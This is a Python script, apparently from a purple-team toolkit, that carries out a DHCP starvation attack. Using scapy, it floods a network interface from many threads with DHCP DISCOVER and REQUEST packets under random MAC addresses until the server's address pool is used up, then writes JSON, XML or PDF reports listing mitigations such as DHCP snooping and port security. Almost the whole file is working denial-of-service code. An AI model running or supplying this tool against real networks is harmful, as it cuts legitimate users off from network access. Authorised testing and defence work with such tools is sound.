#!/usr/bin/env python3
# DHCP Starvation Attack with Reporting (JSON, XML, PDF)

import argparse
import threading
import random
import signal
import sys
import time
import os
import json
import xml.etree.ElementTree as ET
from datetime import datetime
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    sendp, sniff, RandMAC, conf
)
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet

# ANSI color codes
RED = "\033[38;2;255;0;0m"
GREEN = "\033[38;2;0;255;0m"
RESET = "\033[0m"
BOLD = "\033[1m"

# Security recommendations for DHCP Starvation mitigation
RECOMMENDATIONS = [
    {"id": 1, "title": "DHCP Snooping", "severity": "High",
     "description": "Monitor and filter DHCP messages to prevent rogue servers.",
     "metrics": {"binding_table_size": "client count", "drop_rate": "configurable"},
     "sources": ["RFC 7039: DHCP Snooping", "Cisco DHCP Snooping Guide"]},
    {"id": 2, "title": "Port Security", "severity": "Medium",
     "description": "Restrict the number of MAC addresses per port on switches.",
     "metrics": {"max_mac_per_port": 1, "violation_action": "protect/shutdown"},
     "sources": ["Cisco Port Security Docs", "Juniper Port Security"]},
    {"id": 3, "title": "Rate Limiting", "severity": "Medium",
     "description": "Limit DHCP request rate to mitigate flood attacks.",
     "metrics": {"requests_per_second": 10, "blocked_requests": "logged"},
     "sources": ["IETF Best Practices", "Firewall DHCP Rate Limits"]},
    {"id": 4, "title": "VLAN Segmentation", "severity": "Low",
     "description": "Isolate DHCP servers in dedicated VLANs.",
     "metrics": {"vlans": "count", "isolation_ratio": "percentage"},
     "sources": ["NIST SP800-125", "IEEE VLAN Standard"]}
]

# Log directory
LOG_DIR = os.path.expanduser("/var/log/purpleshivatoolslog")
os.makedirs(LOG_DIR, exist_ok=True)

# Global state
stopAttack = False
packetsSent = 0
failures = []
startTime = None
stopTimer = False
stdoutLock = threading.Lock()
timerThread = None
reportFormat = "json"

# Signal handler to stop gracefully
def signal_handler(sig, frame):
    global stopAttack, stopTimer
    print(f"\n{RED}Stopping attack...{RESET}")
    stopAttack = True
    stopTimer = True
    if timerThread and timerThread.is_alive():
        timerThread.join()
    generate_report()
    sys.exit(0)

# Timer thread function
def update_timer(start):
    while not stopTimer:
        elapsed = time.time() - start
        fmt = time.strftime("%H:%M:%S", time.gmtime(elapsed))
        with stdoutLock:
            sys.stdout.write(f"\rPackets sent: {BOLD}{packetsSent}{RESET} | Duration: {BOLD}{fmt}{RESET}")
            sys.stdout.flush()
        time.sleep(1)
    with stdoutLock:
        sys.stdout.write("\n")
        sys.stdout.flush()

# Build DHCP DISCOVER packet
def build_discover(mac, xid=None):
    if xid is None:
        xid = random.randint(1, 0xFFFFFFFF)
    pkt = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=bytes.fromhex(mac.replace(':','')), xid=xid, flags=0x8000) /
        DHCP(options=[('message-type','discover'), 'end'])
    )
    return pkt, xid

# Build DHCP REQUEST packet
def build_request(mac, xid, req_ip, server_ip):
    pkt = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=bytes.fromhex(mac.replace(':','')), xid=xid, flags=0x8000) /
        DHCP(options=[
            ('message-type','request'),
            ('requested_addr', req_ip),
            ('server_id', server_ip),
            'end'
        ])
    )
    return pkt

# Worker thread
def dhcp_worker(interface, per_thread):
    global packetsSent, failures
    conf.iface = interface
    for _ in range(per_thread):
        if stopAttack:
            break
        mac = str(RandMAC())
        try:
            discover, xid = build_discover(mac)
            sendp(discover, verbose=False)
            packetsSent += 1
            # wait for OFFER
            def handle_offer(pkt):
                if BOOTP in pkt and pkt[BOOTP].xid == xid and DHCP in pkt:
                    for opt in pkt[DHCP].options:
                        if opt[0] == 'message-type' and opt[1] == 2:
                            yi = pkt[BOOTP].yiaddr
                            sid = pkt[IP].src
                            req = build_request(mac, xid, yi, sid)
                            sendp(req, verbose=False)
                            global packetsSent
                            packetsSent += 1
            sniff(filter="udp and (port 67 or 68)", prn=handle_offer,
                  timeout=1, iface=interface, stop_filter=lambda x: stopAttack)
        except Exception as e:
            failures.append(str(e))

# Start attack logic
def start_attack(interface, threads_count, packets_per_thread):
    global stopTimer, timerThread, startTime
    print(f"{RED}Starting DHCP Starvation on {interface}{RESET}")
    startTime = time.time()
    stopTimer = False
    timerThread = threading.Thread(target=update_timer, args=(startTime,))
    timerThread.start()

    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=dhcp_worker, args=(interface, packets_per_thread))
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

    stopTimer = True
    timerThread.join()
    print(f"\n{BOLD}Attack complete.{RESET}")
    generate_report(interface, threads_count, packets_per_thread)

# Reporting functions

def write_json_report(path, details):
    with open(path, 'w') as f:
        json.dump(details, f, indent=4)
    print(f"{GREEN}[JSON]{RESET} {path}")


def write_xml_report(path, details):
    root = ET.Element("DHCPStarvationReport")
    for k, v in details.items():
        elem = ET.SubElement(root, k)
        if isinstance(v, list):
            for item in v:
                ET.SubElement(elem, "item").text = str(item)
        else:
            elem.text = str(v)
    # recommendations
    recs = ET.SubElement(root, "SecurityRecommendations")
    for rec in RECOMMENDATIONS:
        r = ET.SubElement(recs, "Recommendation")
        ET.SubElement(r, "ID").text = str(rec['id'])
        ET.SubElement(r, "Title").text = rec['title']
        ET.SubElement(r, "Severity").text = rec['severity']
    tree = ET.ElementTree(root)
    tree.write(path, encoding='utf-8', xml_declaration=True)
    print(f"{GREEN}[XML]{RESET} {path}")


def write_pdf_report(path, details):
    doc = SimpleDocTemplate(path, pagesize=letter)
    styles = getSampleStyleSheet()
    elems = []
    elems.append(Paragraph("DHCP Starvation Report", styles['Title']))
    elems.append(Spacer(1,12))
    elems.append(Paragraph(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", styles['Normal']))
    elems.append(Spacer(1,12))
    # summary table
    data = [["Field", "Value"]]
    for k, v in details.items():
        data.append([k.replace('_',' ').capitalize(), str(v)])
    table = Table(data, colWidths=[200, 300])
    table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,0), colors.HexColor('#003366')),
        ('TEXTCOLOR', (0,0), (-1,0), colors.whitesmoke),
        ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
        ('GRID', (0,0), (-1,-1), 0.5, colors.grey)
    ]))
    elems.append(table)
    elems.append(Spacer(1,12))
    elems.append(Paragraph("Security Recommendations", styles['Heading2']))
    for rec in RECOMMENDATIONS:
        elems.append(Paragraph(f"<b>{rec['title']} ({rec['severity']})</b>", styles['BodyText']))
        elems.append(Paragraph(rec['description'], styles['BodyText']))
        metrics = '<br/>'.join(f"- {k}: {v}" for k, v in rec['metrics'].items())
        elems.append(Paragraph(f"<i>Metrics:</i><br/>{metrics}", styles['BodyText']))
        sources = '<br/>'.join(f"- {s}" for s in rec['sources'])
        elems.append(Paragraph(f"<i>Sources:</i><br/>{sources}", styles['BodyText']))
        elems.append(Spacer(1,12))
    doc.build(elems)
    print(f"{GREEN}[PDF]{RESET} {path}")

# Generate report dispatch

def generate_report(interface=None, threads=None, per_thread=None):
    duration = int(time.time() - startTime) if startTime else 0
    details = {
        'timestamp': datetime.now().isoformat(),
        'interface': interface,
        'threads': threads,
        'packets_per_thread': per_thread,
        'total_packets_sent': packetsSent,
        'duration_seconds': duration,
        'failures': failures
    }
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    base = os.path.join(LOG_DIR, f"dhcpstarve_report_{ts}")
    if reportFormat == 'json':
        write_json_report(base + '.json', details)
    elif reportFormat == 'xml':
        write_xml_report(base + '.xml', details)
    elif reportFormat == 'pdf':
        write_pdf_report(base + '.pdf', details)

# Entry points

def terminal():
    global dnsServers, attackDuration, queryRate, reportFormat
    parser = argparse.ArgumentParser(description="DHCP Starvation Attack Tool with Reporting")
    parser.add_argument('-i','--interface', required=True, help='Network interface')
    parser.add_argument('-t','--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-p','--packets', type=int, default=50, help='Packets per thread')
    parser.add_argument('-r','--report', choices=['json','xml','pdf'], default='json', help='Report format')
    args = parser.parse_args()
    global reportFormat
    reportFormat = args.report
    signal.signal(signal.SIGINT, signal_handler)
    start_attack(args.interface, args.threads, args.packets)


def menu():
    global reportFormat
    signal.signal(signal.SIGINT, signal_handler)
    interface = input(f"Interface (e.g. eth0): ")
    threads = int(input("Threads [10]: ") or 10)
    packets = int(input("Packets per thread [50]: ") or 50)
    reportFormat = input("Report format (json/xml/pdf) [json]: ") or 'json'
    start_attack(interface, threads, packets)

if __name__ == '__main__':
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()
